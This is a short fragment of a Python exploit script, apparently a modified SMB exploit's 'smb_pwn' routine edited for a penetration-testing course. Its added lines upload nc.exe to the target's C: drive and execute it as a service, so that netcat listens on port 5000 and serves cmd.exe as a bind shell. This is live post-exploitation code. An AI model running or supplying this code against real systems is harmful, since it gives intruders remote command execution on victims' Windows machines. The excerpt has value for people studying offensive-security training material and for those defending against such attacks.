...
def smb_pwn(conn, arch):
	...
	#Added 25-Mar-19 - OS-XXXX for PWK
	# Upload nc.exe and establish a bind shell
	smb_send_file(smbConn, '/usr/share/windows-binaries/nc.exe', 'C', '/nc.exe')
	service_exec(conn, r'cmd /c c:\nc.exe -l -p 5000 -e cmd.exe')
